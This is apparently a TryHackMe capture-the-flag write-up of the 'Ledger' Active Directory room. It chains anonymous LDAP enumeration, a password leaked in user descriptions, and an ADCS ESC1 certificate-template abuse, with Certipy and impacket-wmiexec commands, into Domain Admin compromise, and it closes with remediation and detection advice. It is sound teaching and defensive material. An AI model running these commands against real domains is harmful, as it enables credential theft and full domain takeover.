---
title: "TryHackMe: Ledger"
date: 2026-06-06 23:45:00 +0200
categories: [TryHackMe]
tags:
  - windows
  - active-directory
  - ldap
  - smb
  - rdp
  - adcs
  - esc1
  - certipy
  - certificate-abuse
  - privilege-escalation
description: >-
  Ledger chains anonymous Active Directory enumeration, cleartext credential
  disclosure, RDP access, and an ADCS ESC1 certificate-template
  misconfiguration into complete Domain Admin compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_ledger
image:
  path: room_image.webp
  alt: "Original TryHackMe Ledger room artwork"
toc: true
comments: false
---

Ledger is an Active Directory challenge built around excessive anonymous enumeration, directory-stored credentials, broad RDP access, and Active Directory Certificate Services abuse. The validated path progressed from unauthenticated LDAP and Guest SMB enumeration to a valid domain credential, then used the vulnerable `ServerAuth` certificate template to impersonate a Domain Admin and obtain remote administrative execution on the domain controller.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Ledger room card](room_card.webp){: w="292" h="274" .shadow }](https://tryhackme.com/room/ledger){: .center }

## Executive Summary

The target was a Windows Active Directory domain controller exposing standard domain services including:

```text
DNS
Kerberos
LDAP / LDAPS
SMB
RDP
IIS
Global Catalog
RPC
Active Directory Web Services
```

The validated compromise path was:

1. enumerate LDAP without privileged authentication;
2. authenticate to SMB as Guest and confirm additional domain exposure;
3. recover a reusable plaintext password from LDAP user-description fields;
4. validate the credential against domain users;
5. obtain RDP access as `SUSANNA_MCKNIGHT`;
6. retrieve the user-level objective;
7. enumerate Active Directory Certificate Services with Certipy;
8. identify the `ServerAuth` certificate template as vulnerable to ESC1;
9. request a certificate for the privileged user `BRADLEY_ORTIZ`;
10. authenticate with the issued certificate and recover reusable NTLM material;
11. use the privileged credential material for remote administrative execution;
12. confirm Domain Admin-level control and retrieve the final objective.

> **Result:** Low-noise unauthenticated enumeration was converted into complete domain-controller compromise through credential leakage and an exploitable ADCS ESC1 template.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe Ledger laboratory environment.

Testing was limited to the assigned Active Directory host and challenge objectives. Denial-of-service testing, destructive persistence, and activity outside the lab were excluded.

## Initial Enumeration

The target domain and host were identified as:

```text
Domain: thm.local
Host:   LABYRINTH
FQDN:   labyrinth.thm.local
```

Representative service discovery:

```console
$ nmap \
  -p53,80,135,389,443,445,464,593,636,3389,3268,3269,9389,47001 \
  -sV -sC -Pn \
  TARGET_IP
```

The exposed surface was consistent with a domain controller hosting Active Directory, IIS, RDP, and certificate services.

## Anonymous LDAP and Guest SMB Enumeration

LDAP permitted unauthenticated enumeration of domain naming contexts, users, groups, and directory attributes.

Representative LDAP query:

```console
$ ldapsearch \
  -x \
  -LLL \
  -H ldap://TARGET_IP \
  -b "DC=thm,DC=local" \
  "(description=*)" \
  dn sAMAccountName description
```

Guest SMB authentication also succeeded and exposed enough directory and IPC information to support continued reconnaissance.

This allowed valid domain principals and attack paths to be identified without an existing privileged account.

## Cleartext Credential Disclosure in LDAP

LDAP user-description fields contained a reusable password instruction for multiple accounts.

The affected users included:

```text
IVY_WILLIS
SUSANNA_MCKNIGHT
```

The plaintext password itself is intentionally not published:

```text
[REDACTED]
```

The credential was successfully validated against domain services and provided the authenticated foothold required for the later ADCS attack.

## RDP Foothold as SUSANNA_MCKNIGHT

The recovered credential authenticated successfully over RDP as:

```text
THM\SUSANNA_MCKNIGHT
```

The user-level objective was available from the user's Desktop and is published only as:

```text
THM{[REDACTED]}
```

Interactive access also provided a valid authenticated context for ADCS enumeration.

## ADCS Enumeration

Certipy enumeration identified the certificate authority:

```text
thm-LABYRINTH-CA
```

and the vulnerable certificate template:

```text
ServerAuth
```

The template allowed authenticated users to enroll, permitted enrollee-supplied subject or SAN values, and included Client Authentication capability.

These conditions form an **ESC1** certificate-template vulnerability.

Representative enumeration:

```console
$ certipy-ad find \
  -u 'SUSANNA_MCKNIGHT@thm.local' \
  -p '[REDACTED]' \
  -dc-ip TARGET_IP \
  -target labyrinth.thm.local \
  -ldap-scheme ldap \
  -stdout \
  -vulnerable
```

## ESC1 Certificate Impersonation

The vulnerable template was used to request a certificate while supplying the UPN of the privileged account:

```text
BRADLEY_ORTIZ@thm.local
```

Representative request:

```console
$ certipy-ad req \
  -u 'SUSANNA_MCKNIGHT@thm.local' \
  -p '[REDACTED]' \
  -ca 'thm-LABYRINTH-CA' \
  -target labyrinth.thm.local \
  -target-ip TARGET_IP \
  -dc-ip TARGET_IP \
  -template ServerAuth \
  -upn 'BRADLEY_ORTIZ@thm.local' \
  -out bradley
```

The issued certificate represented the privileged user even though the requester was not that user.

## Certificate Authentication and Domain Admin Access

Certificate authentication returned reusable NTLM credential material for:

```text
THM\BRADLEY_ORTIZ
```

The recovered hash is intentionally not published:

```text
[REDACTED]
```

Representative certificate authentication:

```console
$ certipy-ad auth \
  -pfx bradley.pfx \
  -dc-ip TARGET_IP \
  -domain thm.local
```

The privileged credential material was then used for remote command execution:

```console
$ impacket-wmiexec \
  -hashes [REDACTED] \
  THM.LOCAL/BRADLEY_ORTIZ@TARGET_IP
```

The resulting access had Domain Admin-level privileges and provided access to the Administrator desktop.

The final objective is published only as:

```text
THM{[REDACTED]}
```

## Findings

### F-01 - Anonymous and Guest Enumeration Exposure

- **Severity:** Medium
- **Affected services:** LDAP and SMB
- **Impact:** unauthenticated domain reconnaissance

The environment allowed anonymous LDAP queries and Guest SMB authentication, exposing directory structure, users, and group information.

**Remediation:**

- disable anonymous LDAP binds where operationally possible;
- restrict Guest authentication;
- reduce unnecessary IPC exposure;
- monitor bulk LDAP queries and RID-enumeration patterns.

### F-02 - Cleartext Credentials Stored in LDAP Description Fields

- **Severity:** Critical
- **Affected users:** `IVY_WILLIS`, `SUSANNA_MCKNIGHT`
- **Impact:** recovery of valid domain credentials

Directory description fields contained reusable password material.

**Remediation:**

- remove all secret material from directory attributes;
- rotate every affected credential;
- audit LDAP attributes for passwords, tokens, and sensitive keywords;
- use approved password-change workflows instead of directory descriptions;
- alert on suspicious modifications to descriptive user attributes.

### F-03 - Excessive RDP Access for Compromised User

- **Severity:** High
- **Affected user:** `SUSANNA_MCKNIGHT`
- **Impact:** interactive access to the domain environment

The compromised account was permitted to log on over RDP, increasing attacker capability and providing direct access to user data and local enumeration.

**Remediation:**

- restrict RDP to approved administrative groups and jump hosts;
- require MFA for remote interactive access;
- review Remote Desktop Users membership regularly.

### F-04 - ADCS ESC1 Vulnerable Certificate Template

- **Severity:** Critical
- **Affected template:** `ServerAuth`
- **Impact:** arbitrary user impersonation through certificate enrollment

The template allowed low-privileged authenticated users to enroll, supply arbitrary subject/SAN values, and obtain certificates valid for client authentication.

**Remediation:**

- remove broad enrollment rights from sensitive templates;
- disable enrollee-supplied subject/SAN unless explicitly required;
- remove Client Authentication from templates not intended for user logon;
- enable manager approval or authorized signatures where appropriate;
- audit all templates for ESC1-ESC8-style conditions.

### F-05 - Domain Admin Compromise via Certificate Impersonation

- **Severity:** Critical
- **Impersonated user:** `BRADLEY_ORTIZ`
- **Impact:** complete administrative control of the domain controller

The vulnerable certificate template allowed a certificate to be issued for a Domain Admin identity. Certificate authentication then yielded reusable privileged credential material and remote command execution.

**Remediation:**

- remediate the vulnerable template immediately;
- revoke suspicious certificates issued from the affected template;
- rotate affected privileged credentials;
- audit CA request logs for unexpected UPN/SAN requests;
- monitor certificate-based authentication anomalies;
- reduce NTLM exposure where feasible.

## Security Impact

The validated chain resulted in complete domain-controller compromise.

An attacker with equivalent access could:

- enumerate domain users without privileged authentication;
- recover reusable passwords from LDAP attributes;
- gain interactive RDP access;
- abuse certificate enrollment to impersonate privileged users;
- recover privileged NTLM material;
- execute remote commands with Domain Admin authority;
- access or modify domain data;
- establish persistence or dump additional credentials.

The decisive control failure was the combination of exposed credential material and a certificate template that permitted low-privileged users to request authentication certificates for arbitrary identities.

## Detection Opportunities

Useful monitoring controls include:

- alert on anonymous LDAP enumeration and Guest SMB sessions;
- scan directory attributes for credential-like values;
- monitor RDP logons by ordinary domain users;
- alert on certificate requests with requester/subject mismatches;
- monitor `ServerAuth` enrollment by low-privileged principals;
- detect unusual certificate authentication for privileged accounts;
- review CA logs for arbitrary UPN or SAN values;
- alert on remote administrative execution following certificate authentication;
- correlate certificate enrollment with NTLM-authenticated management activity.

## Remediation Priorities

1. Remove plaintext credentials from LDAP description fields.
2. Rotate credentials for all affected users.
3. Disable or restrict the vulnerable `ServerAuth` template.
4. Remove broad enrollment rights and enrollee-supplied subject/SAN capability.
5. Revoke suspicious certificates issued from the vulnerable template.
6. Restrict RDP access for ordinary domain users.
7. Disable Guest authentication and reduce anonymous LDAP exposure.
8. Audit all ADCS templates for ESC1-ESC8 conditions.
9. Implement privileged access tiering and certificate-authentication monitoring.

## Retest Plan

1. Confirm LDAP descriptions contain no password or secret material.
2. Verify anonymous and Guest enumeration is appropriately restricted.
3. Confirm the previous leaked credential no longer authenticates.
4. Verify `SUSANNA_MCKNIGHT` no longer has unnecessary RDP access.
5. Confirm Certipy no longer reports `ServerAuth` as ESC1-vulnerable.
6. Verify low-privileged users cannot enroll for arbitrary UPN or SAN values.
7. Confirm certificate requests for `BRADLEY_ORTIZ` from ordinary users are rejected.
8. Verify previously issued malicious certificates are revoked.
9. Confirm the previous certificate-authentication path no longer produces Domain Admin access.
10. Verify remote command execution with the previously recovered privileged material fails.

## Lessons Learned

Ledger demonstrates how Active Directory compromise can emerge from information exposure and identity infrastructure rather than a traditional software exploit.

Anonymous enumeration exposed the directory, LDAP descriptions leaked a reusable credential, RDP expanded the authenticated foothold, and the ADCS `ServerAuth` template allowed certificate-based impersonation of a Domain Admin.

The strongest defensive response is to treat directory attributes, remote-access rights, certificate-template configuration, CA auditing, and privileged identity protection as one connected Active Directory security boundary.
